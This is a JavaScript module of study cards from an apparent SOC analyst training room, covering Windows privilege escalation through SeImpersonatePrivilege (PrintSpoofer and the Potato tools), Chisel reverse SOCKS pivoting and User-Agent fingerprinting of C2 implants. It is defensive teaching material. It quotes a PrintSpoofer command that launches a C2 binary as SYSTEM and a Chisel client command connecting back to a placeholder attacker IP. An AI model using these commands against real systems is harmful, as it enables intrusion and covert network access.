export default {
  id: "windows-privesc-lateral-movement",
  title: "Privilege Escalation & Lateral Movement",
  src: "Tempest (SOC L1 Capstone)",
  icon: "⬆️",
  cards: [
    {
      title: "SeImpersonatePrivilege — the Potato family",
      span2: true,
      blocks: [
        { t: "txt", text: "<b>SeImpersonatePrivilege</b> lets a process impersonate the security context of another user/token it receives a connection from — legitimate for service accounts, which routinely need to act as the client calling them. The problem: it's granted by default to LOCAL SERVICE, NETWORK SERVICE, and most IIS/SQL/service-account contexts, and holding it is enough to escalate straight to SYSTEM with no actual vulnerability required." },
        { t: "steps", items: [
          "Attacker-controlled process creates a named pipe (e.g. <code>\\\\.\\pipe\\&lt;uuid&gt;\\pipe\\spoolss</code>).",
          "Coerces a SYSTEM-level service (classically the <b>Print Spooler</b>) into connecting to that pipe.",
          "Calls <code>ImpersonateNamedPipeClient</code> on the connection — the process now holds a SYSTEM token.",
          "Uses <code>CreateProcessAsUserW</code>/<code>CreateProcessWithTokenW</code> to launch an arbitrary command (a shell, a second-stage C2 binary) running as SYSTEM.",
        ]},
        { t: "table", head: ["Tool", "Coercion method"], rows: [
          ["PrintSpoofer", "Print Spooler service (MS-RPRN)"],
          ["RoguePotato", "DCOM/OXID resolver, works even with Spooler disabled/patched"],
          ["GodPotato / SweetPotato", "newer variants targeting patched Windows builds"],
          ["JuicyPotato", "original technique, patched on modern Windows (COM server CLSID abuse)"],
        ]},
        { t: "note", kind: "warn", title: "worked example (Tempest)", text: "Downloaded binary <code>spf.exe</code> (SHA256 confirmed via VirusTotal, 57/71 vendor hits, identified as <b>PrintSpoofer</b>) was run as <code>spf.exe -c C:\\ProgramData\\final.exe</code> — launching a second-stage C2 binary with the freshly-stolen SYSTEM token, on a different C2 port than the original low-priv channel." },
        { t: "note", kind: "info", title: "why check for this privilege specifically", text: "<code>whoami /priv</code> showing <b>SeImpersonatePrivilege = Enabled</b> on a compromised low-priv/service account is close to a guaranteed SYSTEM escalation path — treat it as a critical finding the moment it shows up in a triage, not just background noise." },
      ],
    },
    {
      title: "Reverse SOCKS proxy pivoting (Chisel)",
      blocks: [
        { t: "txt", text: "Once inside, an attacker often can't reach internal-only services directly from their C2 channel — a reverse SOCKS proxy tunnels arbitrary traffic through the already-compromised host, turning it into a jump box into the rest of the network." },
        { t: "cmd", label: "worked example (Tempest) — client connecting back to attacker server", code: "chisel.exe client <attacker_ip>:<port> R:socks" },
        { t: "note", kind: "info", title: "identify unknown binaries the same way every time", text: "Pull the <b>SHA256</b> from Sysmon's process/file-hash fields, then search it on VirusTotal — detection count + community tags name the tool directly (don't guess from behavior alone). This is how <code>ch.exe</code> got named as Chisel in this room." },
        { t: "note", kind: "warn", title: "why it matters for scope", text: "Once a SOCKS tunnel is live, treat every subsequent \"internal\" connection from that host as attacker-directed traffic, not user activity — including authentication attempts against internal services (RDP/SMB/WinRM) using any credentials harvested earlier in the intrusion." },
      ],
    },
    {
      title: "Compiled/custom C2 binaries — the UA still gives them away",
      blocks: [
        { t: "txt", text: "A custom-compiled C2 implant has no filename or hash reputation yet, but its language runtime's own HTTP client often self-identifies in the <b>User-Agent</b> header — same fingerprinting logic as known offensive-tool UAs (sqlmap, Nikto), just applied to bespoke malware instead of public tools." },
        { t: "table", head: ["User-Agent string", "What it reveals"], rows: [
          ["<code>Nim httpclient/1.6.6</code>", "Binary compiled in Nim — a compiled language increasingly favored for malware specifically because AV/EDR signature coverage is weaker against it than C/C++/.NET/Go"],
          ["<code>bitsadmin</code>", "Not a compiled implant — the built-in BITS transfer client itself being invoked as a LOLBin download mechanism (T1197)"],
        ]},
        { t: "note", kind: "info", title: "the reusable move", text: "Any unfamiliar UA string is a lead worth pulling on: web-search the exact string to identify the language/library, then treat that as a fingerprint you can filter on to find every other request from the same implant, staged or not." },
      ],
    },
  ],
};
